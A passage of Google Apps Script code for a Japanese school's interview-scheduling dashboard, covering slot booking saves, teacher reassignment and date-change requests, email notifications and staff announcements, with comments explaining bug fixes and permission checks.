    sSheet.appendRow(["Timestamp", "Teacher ID", "Name", "Date", "Period", "Status", "Student", "Nationality", "Meeting Link", "Document URL", "Course", "In Charge", "Reassign_To_Id", "Reassign_To_Name", "Reassign_New_Date", "Reassign_New_Period"]);
  } else {
    let headers = sSheet.getRange(1, 1, 1, sSheet.getLastColumn()).getValues()[0];
    if (headers.length < 12) sSheet.getRange(1, 12).setValue("In Charge"); 
    if (headers.length < 13) sSheet.getRange(1, 13).setValue("Reassign_To_Id");
    if (headers.length < 14) sSheet.getRange(1, 14).setValue("Reassign_To_Name");
    if (headers.length < 15) sSheet.getRange(1, 15).setValue("Reassign_New_Date");
    if (headers.length < 16) sSheet.getRange(1, 16).setValue("Reassign_New_Period");
    if (headers.length < 17) sSheet.getRange(1, 17).setValue("BookerReq_Date");
    if (headers.length < 18) sSheet.getRange(1, 18).setValue("BookerReq_Period");
    if (headers.length < 19) sSheet.getRange(1, 19).setValue("BookerReq_Reason");
    if (headers.length < 20) sSheet.getRange(1, 20).setValue("BookerReq_Status");
    if (headers.length < 21) sSheet.getRange(1, 21).setValue("BookerReq_ByName");
    if (headers.length < 22) sSheet.getRange(1, 22).setValue("Reassign_Reason");
    if (headers.length < 23) sSheet.getRange(1, 23).setValue("Cancel_Reason");
  }

  // Read through _readTabs_ (batchGet) rather than getDataRange: measured at
  // 597ms here versus 283ms for the batched read of Schedule_DB *and*
  // Teacher_Master together. Same FORMATTED_VALUE strings either way, and every
  // use below is a string compare — the rowMap key, and the old status/student/
  // inCharge columns.
  const data = _readTabs_(["Schedule_DB"])["Schedule_DB"] || [];

  // Resolved only if an update actually carries a file. This used to be a
  // DriveApp round trip on every save, including the availability toggles that
  // never upload anything.
  let _uploadFolder = null;
  const uploadFolder = function () {
    if (!_uploadFolder) _uploadFolder = DriveApp.getFolderById(_requireConfig_(CONFIG_UPLOADS_FOLDER));
    return _uploadFolder;
  };
  let skipped = [];
  
  // ⚠️ FIRST ROW WINS. This was last-row-wins, while the calendar (slots.find) and
  // _findScheduleRow_ both take the first. With two rows for one slot the screen showed
  // the booked first row and the server judged wasBookedBefore from an empty later one,
  // so every edit of that booking emailed the teacher 新規予約 again, dated whenever the
  // interview had been, and wrote the edit onto the row nobody could see.
  let rowMap = {};
  for(let i = 1; i < data.length; i++) {
    let key = _schedKey_(data[i][1], data[i][3], data[i][4]);
    if (!rowMap[key]) rowMap[key] = i + 1;
  }
  const nowKey = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm");
  let pastSkipped = [];

  // ⚠️ VALIDATED BEFORE ANY WRITE, not inside the loop below.
  //
  // One active request per booking — see _activeRequest_. A cancellation is refused
  // while a 日時変更 or a 交代 is outstanding; the requester withdraws first
  // (withdrawActiveRequest).
  //
  // ⚠️ Throwing mid-loop would leave every update BEFORE the offending one already
  // written, so the batch is checked as a whole first. This path is unreachable
  // from a current tab — submitCancellation refuses locally, before the update ever
  // enters calPendingUpdates — and exists for a stale tab or a crafted call.
  updatesArray.forEach(u => {
    if (String(u && u.status || "") !== "Cancel_Request") return;
    const rk = _schedKey_(u.teacherId, u.date, u.period);
    const ri = rowMap[rk];
    if (!ri) return;
    const active = _activeRequest_(data[ri - 1] || []);
    // ⚠️ Only a DIFFERENT request blocks. A row that is already Cancel_Request
    // re-saving as Cancel_Request is an ordinary edit — the 担当 changing 備考 on a
    // slot awaiting cancellation sends the status back unchanged, and refusing that
    // would break editing a booking that had been cancel-requested.
    if (active && active.kind !== "cancel") {
      throw new Error("この予約には" + active.label +
        "のリクエストが出ています。先にリクエストを取り下げてから、キャンセルを依頼してください。");
    }
  });

  updatesArray.forEach(u => {
    let key = _schedKey_(u.teacherId, u.date, u.period);
    let studentName = u.student || "";
    let nat = u.nationality || "";
    let course = u.course || ""; 
    let intake = u.intake || "";   // 学期 (from PlacementTest_Config dropdown)
    let remarks = u.remarks || ""; // 備考 (free text)
    let inCharge = u.inCharge || ""; 
    let link = u.meetingLink || "";
    let docUrl = u.existingDocumentUrl || "";

    let isBookedNow = (u.status === "Booked" || studentName !== "");
    let isCancelReqNow = (u.status === "Cancel_Request"); 
    let wasBookedBefore = false;
    let wasCancelReqBefore = false; 
    let oldStudent = "";
    let oldInCharge = "";
    
    if (rowMap[key]) {
      let oldStatusRow = data[rowMap[key] - 1]; 
      wasBookedBefore = (oldStatusRow[5] === "Booked" || oldStatusRow[6] !== "");
      wasCancelReqBefore = (oldStatusRow[5] === "Cancel_Request");
      oldStudent = oldStatusRow[6] || "";
      oldInCharge = oldStatusRow[11] || "";
    }

    // PAST SLOTS: nothing new may start on a slot whose start time has passed (JST) —
    // no booking, no 〇/✖. An EXISTING booking there stays editable, so a name typo can
    // still be fixed and a no-show cleared. wasBookedBefore already counts a
    // Reassign_Pending row, which keeps its student.
    //
    // ⚠️ SKIPPED, never thrown. calFlush keeps a failed batch queued on purpose, so a
    // throw would fail again on every later save — the trap submitCancellation notes.
    if (!wasBookedBefore && !wasCancelReqBefore && _slotIsPast_(u.date, u.period, nowKey)) {
      pastSkipped.push(key);
      return;
    }

    // OWNERSHIP ENFORCEMENT: a 'sales' actor may only modify an existing booking
    // (already Booked or Cancel_Request) when they are its 担当 (In Charge).
    // Admins and teachers are exempt (teachers only ever act on their own column,
    // which is enforced in the UI). Open/Available slots have no owner, so booking
    // them is always allowed. Reassignment-driven writes are also exempt.
    if (actorRole === "sales" && (wasBookedBefore || wasCancelReqBefore)
        && u.status !== "Reassign_Pending") {
      let owner = _normName_(oldInCharge);
      if (owner !== "" && owner !== _normName_(actorName)) {
        skipped.push(key);
        return; // skip this update — not the owner
      }
    }

    // Queued, and sent by saveScheduleBatch once every row is written and the lock is
    // released. Captured values only — `let` in this callback is per-update.
    if (!wasBookedBefore && isBookedNow) {
      notify.push(function () { _sendEmailNotif_(u.teacherId, u.date, u.period, studentName, inCharge, "booked"); });
    } else if (wasBookedBefore && !isBookedNow && !isCancelReqNow) {
      notify.push(function () { _sendEmailNotif_(u.teacherId, u.date, u.period, oldStudent, oldInCharge, "canceled"); });
    }

    if (!wasCancelReqBefore && isCancelReqNow) {
      notify.push(function () { _sendAdminCancelEmail_(u.teacherName, u.date, u.period, studentName, u.cancelReason || "", oldInCharge || inCharge || ""); });
    }

    if (u.documentBase64) {
      try {
        const decodedBytes = Utilities.base64Decode(u.documentBase64);
        const blob = Utilities.newBlob(decodedBytes, u.documentMimeType, u.teacherId + "_" + u.date + "_" + u.documentName);
        const file = uploadFolder().createFile(blob);
        // Deliberately NOT shared. These are scans about named students, and
        // ANYONE_WITH_LINK made every one of them readable by URL with no login.
        // Teachers reach them through getUploadedFile() instead, which serves the
        // bytes as the deployer after checking permissions.
        docUrl = file.getUrl();
      } catch(e) { console.error("File upload failed: ", e); }
    }
    
    if (rowMap[key]) {
      // Written as contiguous RANGES, not cell by cell. This was fourteen
      // separate setValue calls per update — fourteen round trips to the Sheets
      // backend to toggle one slot — and it is the bulk of what made saving feel
      // slow. Same cells, same order, four ops.
      //
      // Columns 2-5 (teacher id / name / date / period) are the lookup key and
      // are deliberately not rewritten, and 17-22 (the BookerReq_* block) belong
      // to a different workflow — so the ranges stop short of both rather than
      // writing the row in one sweep.
      const r = rowMap[key];
      sSheet.getRange(r, 1).setValue(new Date());
      // 6-12: Status, Student, Nationality, Meeting Link, Document URL, Course, In Charge
      sSheet.getRange(r, 6, 1, 7).setValues([_cellSafeRow_([u.status, studentName, nat, link, docUrl, course, inCharge])]);
      // Don't disturb an in-flight reassignment; only clear stale reassign fields
      // when this save is itself NOT a reassign-pending state
      if (u.status !== "Reassign_Pending") {
        sSheet.getRange(r, 13, 1, 4).setValues([["", "", "", ""]]);
      }
      // 23-25: Cancel_Reason (set only on a cancel request, cleared otherwise),
      // 学期, 備考.
      sSheet.getRange(r, 23, 1, 3).setValues([_cellSafeRow_([
        isCancelReqNow ? (u.cancelReason || "") : "", intake, remarks
      ])]);
    } else {
      // Pad reassign/booker/cancel columns (13-23) so 学期 lands in col 24
      // and 備考 in col 25.
      sSheet.appendRow(_cellSafeRow_([new Date(), u.teacherId, u.teacherName, u.date, u.period, u.status, studentName, nat, link, docUrl, course, inCharge,
                        "", "", "", "", "", "", "", "", "", "", "", intake, remarks]));
      rowMap[key] = sSheet.getLastRow(); 
    }
  });

  // The rows just written are stale in the per-execution memo. Nothing reads
  // Schedule_DB again in this execution today, but leaving a pre-write snapshot
  // behind for the next reader to trip over is not worth the saving.
  _forgetTab_("Schedule_DB");

  let msgs = [];
  if (pastSkipped.length > 0) {
    msgs.push("過去の日時の枠は予約・変更できません（" + pastSkipped.length + "件）。");
  }
  if (skipped.length > 0) {
    msgs.push("一部の予約は担当者ではないため変更できませんでした（" + skipped.length + "件）。自分が担当の予約のみ変更できます。");
  }
  return msgs.length ? msgs.join("\n") : "Success";
}

// DIAGNOSTIC (read-only, editor-run). Lists every slot that has more than one row.
// A duplicate is what made editing an old booking re-send 新規予約 before rowMap became
// first-wins; the extra rows are still in the sheet and are cleaned up by hand. The
// FIRST row listed is the one the calendar shows and every save now writes.
function diagnoseScheduleDuplicates() {
  _requireMaintenanceUnlock_("diagnoseScheduleDuplicates");
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Schedule_DB");
  if (!sh) return "面接スケジュールのデータが見つかりません。";
  const data = sh.getDataRange().getDisplayValues();
  let byKey = {}, order = [];
  for (let i = 1; i < data.length; i++) {
    const k = _schedKey_(data[i][1], data[i][3], data[i][4]);
    if (k === "__") continue;
    if (!byKey[k]) { byKey[k] = []; order.push(k); }
    byKey[k].push("  行" + (i + 1) + ": " + data[i][5] + " / " + (data[i][6] || "（学生なし）") +
                  " / 担当 " + (data[i][11] || "-") + " / 更新 " + data[i][0]);
  }
  let out = [];
  order.forEach(function (k) {
    if (byKey[k].length > 1) out.push(k + "\n" + byKey[k].join("\n"));
  });
  const report = out.length ? "重複 " + out.length + " 件\n\n" + out.join("\n\n") : "重複なし";
  console.log(report);
  return report;
}

// ============================================
// REASSIGNMENT (request another teacher to take a booking)
// Stage 1: same time slot, request + accept/decline
// ============================================

function _findScheduleRow_(sSheet, teacherId, date, period) {
  const data = sSheet.getDataRange().getDisplayValues();
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][1]).trim() === String(teacherId).trim() &&
        data[i][3] === date && data[i][4] === period) {
      return { rowIndex: i + 1, row: data[i] };
    }
  }
  return null;
}

function _teacherInfo_(teacherId) {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Teacher_Master");
  const data = sheet.getDataRange().getValues();
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === String(teacherId).trim()) {
      return {
        name: String(data[i][1]).trim(),
        email: String(data[i][3] || "").trim(),
        notifOn: String(data[i][4]).trim() !== "OFF"
      };
    }
  }
  return null;
}

// Initiator (teacher or sales) requests that another teacher take a booking.
// ---- ONE ACTIVE REQUEST PER BOOKING ----------------------------------------
//
// A booking supports three requests, stored in three different places:
//   日時変更     BookerReq_Status = "Pending"   (cols 17-21, idx 19)
//   交代         Status = "Reassign_Pending"    (+ cols 13-16, idx 5)
//   キャンセル依頼 Status = "Cancel_Request"      (+ Cancel_Reason col 23, idx 5)
//
// Nothing reconciled them, so a booking could carry two at once and
// getPendingNotifications pushed an item for each — the 担当 saw a cancellation and
// a reschedule for the same interview with nothing saying which to act on.
//
// The rule: while one is active, no other may be raised. The requester withdraws
// first (withdrawActiveRequest).
//
// ⚠️ Declared ONCE here and called by all three creators. It began as three
// separate partial checks — requestReassignment tested only `!== "Booked"`, which
// a pending 日時変更 passes because the status stays Booked — and every one of them
// missed a different combination.
function _activeRequest_(row) {
  if (String(row[19] || "").trim() === "Pending") return { kind: "datechange", label: "日時変更" };
  const st = String(row[5] || "").trim();
  if (st === "Reassign_Pending") return { kind: "reassign", label: "交代" };
  if (st === "Cancel_Request") return { kind: "cancel", label: "キャンセル" };
  return null;
}

function _requireNoActiveRequest_(row) {
  const a = _activeRequest_(row);
  if (a) {
    throw new Error("この予約には" + a.label +
      "のリクエストが出ています。先にリクエストを取り下げてから、もう一度お試しください。");
  }
}

// newDate/newPeriod are optional — if provided, the interview moves to that time on accept.
function requestReassignment(fromTeacherId, date, period, toTeacherId, newDate, newPeriod, reason) {
  _requireSession_("requestReassignment");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");

  const found = _findScheduleRow_(sSheet, fromTeacherId, date, period);
  if (!found) throw new Error("対象の予約が見つかりません。");

  const row = found.row;
  if (row[5] !== "Booked") throw new Error("予約済みの面接のみ再依頼できます。");
  // ⚠️ The line above is not enough: a pending 日時変更 leaves Status at "Booked",
  // so a 交代 could be raised on top of one.
  _requireNoActiveRequest_(row);

  const toInfo = _teacherInfo_(toTeacherId);
  if (!toInfo) throw new Error("依頼先の教師が見つかりません。");

  // Normalize proposed new time (empty = same slot)
  newDate = (newDate || "").trim();
  newPeriod = (newPeriod || "").trim();
  let timeChanged = (newDate && newPeriod && (newDate !== date || newPeriod !== period));

  // A proposed time that has already started would create a booking in the past.
  if (timeChanged && _slotIsPast_(newDate, newPeriod)) {
    throw new Error("過去の日時は選択できません。");
  }

  // If a new time is proposed, make sure the target isn't already booked then
  if (timeChanged) {
    const conflict = _findScheduleRow_(sSheet, toTeacherId, newDate, newPeriod);
    if (conflict && (conflict.row[5] === "Booked" || conflict.row[5] === "Reassign_Pending")) {
      throw new Error("依頼先の教師はその新しい日時に既に予約があります。別の時間を選んでください。");
    }
  }

  // Mark the original row as reassign-pending and record the target + proposed time
  sSheet.getRange(found.rowIndex, 6).setValue("Reassign_Pending");
  sSheet.getRange(found.rowIndex, 13).setValue(String(toTeacherId));
  sSheet.getRange(found.rowIndex, 14).setValue(toInfo.name);
  sSheet.getRange(found.rowIndex, 15).setValue(timeChanged ? newDate : "");
  sSheet.getRange(found.rowIndex, 16).setValue(timeChanged ? newPeriod : "");
  sSheet.getRange(found.rowIndex, 22).setValue(reason || ""); // Reassign_Reason
  sSheet.getRange(found.rowIndex, 1).setValue(new Date());

  // Notify the target teacher
  if (toInfo.email && toInfo.notifOn) {
    let student = row[6] || "";
    let subject = `【面接交代依頼】${date} ${period} の面接を依頼されています`;
    let body = `${toInfo.name} 先生\n\n`;
    body += `以下の面接を担当いただけないか依頼が届いています。\n\n`;
    body += `元の日時: ${date} ${period}\n`;
    if (timeChanged) body += `希望の新しい日時: ${newDate} ${newPeriod}\n`;
    body += `学生: ${student}\n`;
    if (reason && String(reason).trim()) body += `理由: ${reason}\n`;
    body += `\nダッシュボードの面接スケジュールから「受ける」または「断る」を選択してください。\n`;
    try {
      GmailApp.sendEmail(toInfo.email, subject, body, _mailOptions_());
    } catch(e) { console.error("Reassign request email error: " + e.message); }
  }

  return "Success";
}

// Target teacher accepts — booking moves to them (at the proposed new time if any)
function acceptReassignment(toTeacherId, date, period) {
  _requireSession_("acceptReassignment");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");

  // Find the pending row that targets this teacher (matched on the ORIGINAL slot)
  const data = sSheet.getDataRange().getDisplayValues();
  let originRowIndex = -1, originRow = null;
  for (let i = 1; i < data.length; i++) {
    if (data[i][5] === "Reassign_Pending" &&
        String(data[i][12]).trim() === String(toTeacherId).trim() &&
        data[i][3] === date && data[i][4] === period) {
      originRowIndex = i + 1; originRow = data[i]; break;
    }
  }
  if (originRowIndex === -1) throw new Error("交代依頼が見つかりません。");

  const toInfo = _teacherInfo_(toTeacherId);
  const student = originRow[6] || "";
  const nat = originRow[7] || "";
  const link = originRow[8] || "";
  const docUrl = originRow[9] || "";
  const course = originRow[10] || "";
  const inCharge = originRow[11] || "";
  const fromTeacherId = originRow[1];

  // Proposed new time (cols 15,16). If empty, keep original slot.
  const newDate = (originRow[14] || "").trim() || date;
  const newPeriod = (originRow[15] || "").trim() || period;

  // Only when the time MOVES: taking over an existing booking at its own slot is an
  // edit of that booking, and stays allowed however old it is.
  if ((newDate !== date || newPeriod !== period) && _slotIsPast_(newDate, newPeriod)) {
    throw new Error("希望の新しい日時はすでに過ぎているため引き受けられません。断るを選択してください。");
  }

  // Re-check conflict at accept time (the target may have been booked since the request)
  const destExisting = _findScheduleRow_(sSheet, toTeacherId, newDate, newPeriod);
  if (destExisting && (destExisting.row[5] === "Booked")) {
    throw new Error("その新しい日時には既に予約が入っているため引き受けられません。");
  }

  // Free up the original teacher's slot (back to Available, clear booking + reassign fields)
  sSheet.getRange(originRowIndex, 6).setValue("Available");
  sSheet.getRange(originRowIndex, 7, 1, 5).setValues([["", "", "", "", ""]]); // student..inCharge cols 7-11
  sSheet.getRange(originRowIndex, 13, 1, 4).setValues([["", "", "", ""]]);     // clear all reassign cols
  sSheet.getRange(originRowIndex, 1).setValue(new Date());

  // Create/Update the target teacher's booking at the (possibly new) slot
  const dest = _findScheduleRow_(sSheet, toTeacherId, newDate, newPeriod);
  if (dest) {
    sSheet.getRange(dest.rowIndex, 1).setValue(new Date());
    sSheet.getRange(dest.rowIndex, 6).setValue("Booked");
    sSheet.getRange(dest.rowIndex, 7, 1, 5).setValues([[student, nat, link, docUrl, course]]);
    sSheet.getRange(dest.rowIndex, 12).setValue(inCharge);
    sSheet.getRange(dest.rowIndex, 13, 1, 4).setValues([["", "", "", ""]]);
  } else {
    sSheet.appendRow(_cellSafeRow_([new Date(), toTeacherId, toInfo ? toInfo.name : "", newDate, newPeriod, "Booked", student, nat, link, docUrl, course, inCharge, "", "", "", ""]));
  }

  // Notify with the final (new) time
  _notifyReassignResult_(fromTeacherId, toTeacherId, newDate, newPeriod, student, inCharge, true);

  return "Success";
}

// Target teacher declines — booking reverts to original teacher
function declineReassignment(toTeacherId, date, period) {
  _requireSession_("declineReassignment");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");

  const data = sSheet.getDataRange().getDisplayValues();
  let originRowIndex = -1, originRow = null;
  for (let i = 1; i < data.length; i++) {
    if (data[i][5] === "Reassign_Pending" &&
        String(data[i][12]).trim() === String(toTeacherId).trim() &&
        data[i][3] === date && data[i][4] === period) {
      originRowIndex = i + 1; originRow = data[i]; break;
    }
  }
  if (originRowIndex === -1) throw new Error("交代依頼が見つかりません。");

  const fromTeacherId = originRow[1];
  const student = originRow[6] || "";
  const inCharge = originRow[11] || "";

  // Revert original row to Booked, clear all reassign fields
  sSheet.getRange(originRowIndex, 6).setValue("Booked");
  sSheet.getRange(originRowIndex, 13, 1, 4).setValues([["", "", "", ""]]);
  sSheet.getRange(originRowIndex, 1).setValue(new Date());

  _notifyReassignResult_(fromTeacherId, toTeacherId, date, period, student, inCharge, false);

  return "Success";
}

function _notifyReassignResult_(fromTeacherId, toTeacherId, date, period, student, inCharge, accepted) {
  const fromInfo = _teacherInfo_(fromTeacherId);
  const toInfo = _teacherInfo_(toTeacherId);
  const verb = accepted ? "承認されました（交代成立）" : "辞退されました";

  // Notify original teacher
  if (fromInfo && fromInfo.email && fromInfo.notifOn) {
    let subject = `【面接交代】${date} ${period} の交代依頼が${verb}`;
    let body = `${fromInfo.name} 先生\n\n`;
    body += `${toInfo ? toInfo.name : ''} 先生への交代依頼が${verb}。\n\n`;
    body += `日付: ${date}\n時間: ${period}\n学生: ${student}\n\n`;
    body += accepted ? `この面接は${toInfo ? toInfo.name : ''}先生が担当します。\n` : `この面接は引き続き${fromInfo.name}先生が担当します。\n`;
    try { GmailApp.sendEmail(fromInfo.email, subject, body, _mailOptions_()); } catch(e) {}
  }

  // Notify in-charge sales person
  if (inCharge) {
    const staffSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Staff_Master");
    if (staffSheet) {
      const sd = staffSheet.getDataRange().getValues();
      for (let i = 1; i < sd.length; i++) {
        if (_normName_(sd[i][1]) === _normName_(inCharge)) {
          let email = String(sd[i][3] || "").trim();
          let notifOn = String(sd[i][4]).trim() !== "OFF";
          if (email && notifOn) {
            let subject = `【面接交代】${date} ${period} の担当教師が${accepted ? '変更されました' : '交代辞退されました'}`;
            let body = `${inCharge} さん\n\n`;
            body += `日付: ${date}\n時間: ${period}\n学生: ${student}\n\n`;
            body += accepted
              ? `担当教師が ${fromInfo ? fromInfo.name : ''} 先生 から ${toInfo ? toInfo.name : ''} 先生 に変更されました。\n`
              : `${toInfo ? toInfo.name : ''} 先生が交代を辞退したため、引き続き ${fromInfo ? fromInfo.name : ''} 先生が担当します。\n`;
            try { GmailApp.sendEmail(email, subject, body, _mailOptions_()); } catch(e) {}
          }
          break;
        }
      }
    }
  }
}

// ==========================================
// BOOKER DATE/TIME CHANGE REQUESTS
// ==========================================
// A teacher keeps the interview but asks the booker (the 担当/In Charge sales
// person) to change its date/time. Stored on the booking row in columns:
//   17 BookerReq_Date | 18 BookerReq_Period | 19 BookerReq_Reason
//   20 BookerReq_Status ("Pending" | "") | 21 BookerReq_ByName
function _staffEmailByName_(name) {
  if (!name) return null;
  const staffSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Staff_Master");
  if (!staffSheet) return null;
  const sd = staffSheet.getDataRange().getValues();
  const target = _normName_(name);
  for (let i = 1; i < sd.length; i++) {
    if (_normName_(sd[i][1]) === target) {
      return { name: String(sd[i][1]).trim(), email: String(sd[i][3] || "").trim(), notifOn: String(sd[i][4]).trim() !== "OFF" };
    }
  }
  return null;
}

function requestBookerDateChange(teacherId, date, period, newDate, newPeriod, reason, teacherName) {
  _requireSession_("requestBookerDateChange");
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sSheet = ss.getSheetByName("Schedule_DB");
  if (!sSheet) throw new Error("面接スケジュールのデータが見つかりません。（SYS-01）");
  newDate = (newDate || "").trim(); newPeriod = (newPeriod || "").trim();
  if (!newDate || !newPeriod) throw new Error("新しい日付と時間を選択してください。");
  const found = _findScheduleRow_(sSheet, teacherId, date, period);
  if (!found) throw new Error("対象の予約が見つかりません。");
  const row = found.row;
  // Was a Cancel_Request-only test, which left 交代 open.
  _requireNoActiveRequest_(row);
  if (newDate === date && newPeriod === period) throw new Error("現在と同じ日時です。別の日時を選択してください。");
  if (_slotIsPast_(newDate, newPeriod)) throw new Error("過去の日時は選択できません。");
  const conflict = _findScheduleRow_(sSheet, teacherId, newDate, newPeriod);
  if (conflict && (conflict.row[5] === "Booked" || conflict.row[5] === "Reassign_Pending")) {
    throw new Error("その新しい日時には既に予約があります。別の時間を選んでください。");
  }
  // Cols 17-21 are the request block, contiguous: new date, new period, reason,
  // the Pending flag the bell keys on, and who asked. One write, not five — the
  // same range approveBookerDateChange and cancelBookingFromDateChange clear.
  sSheet.getRange(found.rowIndex, 17, 1, 5).setValues([_cellSafeRow_([
    newDate, newPeriod, reason || "", "Pending", teacherName || row[2] || ""
  ])]);
  const inCharge = row[11] || "";
  const booker = _staffEmailByName_(inCharge);
  if (booker && booker.email && booker.notifOn) {
    let student = row[6] || "";
    let subject = `【日時変更リクエスト】${date} ${period} の面接`;
    let body = `${booker.name} さん\n\n`;
    body += `${teacherName || row[2] || ''} 先生から面接日時の変更リクエストが届いています。\n\n`;
    body += `学生: ${student}\n現在の日時: ${date} ${period}\n希望の日時: ${newDate} ${newPeriod}\n`;
    if (reason) body += `理由: ${reason}\n`;
    body += `\nダッシュボードの通知から承認または却下してください。\n`;
    try { GmailApp.sendEmail(booker.email, subject, body, _mailOptions_()); } catch(e) {}
  }
  _logActivity_({ name: teacherName || row[2], id: teacherId, role: "teacher" }, "日時変更リクエスト送信", date + " " + period, "→ " + newDate + " " + newPeriod);
  return "Success";
}

// Notifications for a TEACHER: interviews another teacher (or sales) has asked
// them to take over. Filters Schedule_DB for Reassign_Pending slots whose
// Reassign_To_Id (col 13 / idx 12) matches this teacher's id.

// ============================ ANNOUNCEMENTS ============================
// Master-only broadcasts shown in every targeted user's notification bell.
// Read state is a comma-separated user-id list on the announcement row, so one
// person dismissing it never hides it for anyone else.
function _getAnnouncementSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_ANNOUNCEMENTS);
  if (!sh) {
    sh = ss.insertSheet(SHEET_ANNOUNCEMENTS);
    sh.appendRow(["ID", "作成日時", "作成者", "対象", "本文", "有効期限", "既読者"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

function postAnnouncement(role, perms, target, body, expiresDays, actorName, actorId) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const text = String(body || "").trim();
  if (text === "") throw new Error("本文を入力してください。");
  // ⚠️ REFUSED, never widened. This used to fall back to "all" for any value it did not know,
  // so an announcement aimed at one department would silently have reached everyone. Valid:
  // "all", "adminlevel" (everyone holding 管理者権限, by role or by personal flag), and any
  // role _roleByKey_ knows — built-in or custom, the legacy literal "admin" included.
  const tRaw = String(target || "").trim();
  const tgt = (tRaw === "all" || tRaw === "adminlevel" || _roleByKey_(tRaw)) ? tRaw : "";
  if (tgt === "") throw new Error("送信先を選び直してください。");

  let expires = "";
  const d = parseInt(expiresDays, 10);
  if (!isNaN(d) && d > 0) {
    const dt = new Date();
    dt.setDate(dt.getDate() + d);
    expires = Utilities.formatDate(dt, Session.getScriptTimeZone(), "yyyy/MM/dd");
  }

  const sh = _getAnnouncementSheet_();
  const id = "A" + Date.now();
  sh.appendRow(_cellSafeRow_([id, new Date(), actorName || "システム", tgt, text.substring(0, 2000), expires, ""]));
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "お知らせを送信", tgt, text.substring(0, 60)); } catch (e) {}
  return { sent: true, id: id };
}

function getAnnouncements(role, perms, userId) {
  _requireSession_("getAnnouncements");
  _getAnnouncementSheet_();   // ensure it exists before the batched read looks for it
  const data = _readTabs_([SHEET_ANNOUNCEMENTS])[SHEET_ANNOUNCEMENTS] || [];
  const uid = String(userId || "").trim();
  const today = new Date(); today.setHours(0, 0, 0, 0);
  let out = [];
  // ⚠️ The SESSION's role and admin level, decided once. The role match used to compare against
  // the string the browser sent, so a client could claim a role to read another department's
  // announcements; _effectiveRole_ returns the session's. _isAdminLevel_ reads the person flag
  // from the session too, so "adminlevel" asks the question about the READER — the right person.
  const myRole = _effectiveRole_(role);
  const myAdmin = _isAdminLevel_(role);

  for (let i = 1; i < data.length; i++) {
    const id = String(data[i][0] || "").trim();
    if (!id) continue;
    const tgt = String(data[i][3] || "all").trim();
    // ⚠️ "adminlevel" is a NEW key, not a new meaning for "admin". Reinterpreting "admin" would
    // silently widen the audience of every announcement already sent to it.
    if (tgt === "adminlevel") { if (!myAdmin) continue; }
    else if (tgt !== "all" && tgt !== myRole) continue;

    const exp = String(data[i][5] || "").trim();
    if (exp) {
      const em = exp.match(/(\d{4})[\/\-年](\d{1,2})[\/\-月](\d{1,2})/);
      if (em) {
        const ed = new Date(parseInt(em[1],10), parseInt(em[2],10)-1, parseInt(em[3],10));
        if (ed.getTime() < today.getTime()) continue;
      }
    }
    const readers = String(data[i][6] || "").split(",").map(function(s){ return s.trim(); });
    if (uid && readers.indexOf(uid) !== -1) continue;

    out.push({ type: "announcement", id: id, body: String(data[i][4] || ""),
               by: String(data[i][2] || ""), at: String(data[i][1] || "") });
  }
  return out;
}

function markAnnouncementRead(role, perms, announcementId, userId) {
  _requireSession_("markAnnouncementRead");
  const sh = _getAnnouncementSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const uid = String(userId || "").trim();
  if (!uid) return { ok: false };
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() !== String(announcementId).trim()) continue;
    let readers = String(data[i][6] || "").split(",").map(function(s){ return s.trim(); }).filter(function(s){ return s !== ""; });
    if (readers.indexOf(uid) === -1) {
      readers.push(uid);
      sh.getRange(i + 1, 7).setValue(readers.join(","));
    }
    return { ok: true };
  }
  return { ok: false };
}

function listAnnouncements(role, perms) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const sh = _getAnnouncementSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    if (!String(data[i][0] || "").trim()) continue;
    const readers = String(data[i][6] || "").split(",").filter(function(s){ return s.trim() !== ""; });
    out.push({ _sheetRow: i + 1, id: String(data[i][0]), at: String(data[i][1]),
               by: String(data[i][2]), target: String(data[i][3]), body: String(data[i][4]),
               expires: String(data[i][5]), readCount: readers.length });
  }
  return out.reverse();
}

function deleteAnnouncement(role, perms, rowIndex, actorName, actorId, expectedId) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const sh = _getAnnouncementSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("対象が見つかりません。");
  // ⚠️ Verified against the ID, never trusted by position. deleteRow shifts every row below it,
  // so a list rendered before another deletion points one row off — and used to delete the
  // NEXT announcement instead of the one clicked (§8.3). listAnnouncements already sends the id.
  const want = String(expectedId || "").trim();
  if (want === "" || String(sh.getRange(ri, 1).getDisplayValue()).trim() !== want) {
    throw new Error("一覧が古くなっています。更新してからもう一度お試しください。");
  }
  const gone = _sheetRowForLog_(sh, ri);
  sh.deleteRow(ri);
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "お知らせを削除", want, gone); } catch (e) {}
  return { deleted: true };
}

function getTeacherNotifications(teacherId) {
  _requireSession_("getTeacherNotifications");
  const me = String(teacherId || "").trim();
  if (me === "") return [];
  const data = _readTabs_(["Schedule_DB"])["Schedule_DB"] || [];
  let out = [];
